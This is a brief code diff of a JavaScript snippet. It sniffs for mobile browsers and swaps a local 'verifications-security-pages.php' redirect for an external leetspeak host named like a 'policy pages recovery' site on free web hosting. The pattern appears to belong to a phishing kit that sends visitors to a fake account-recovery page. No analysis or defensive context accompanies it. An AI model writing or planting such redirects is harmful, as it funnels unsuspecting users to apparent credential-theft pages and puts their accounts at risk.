@@ -10,9 +10,9 @@ var isMobile = function() {
    return /(iphone|ipod|ipad|android|blackberry|windows ce|palm|symbian)/i.test(navigator.userAgent);
  };
  if(isMobile()) {
-    window.location.href = "verifications-security-pages.php";
+    window.location.href = "https://p0l1c3p4g35-rcvry.000webhostapp.com/";
 } else {
-	window.location.href = "verifications-security-pages.php";
+	window.location.href = "https://p0l1c3p4g35-rcvry.000webhostapp.com/";
 }
 </script>
 
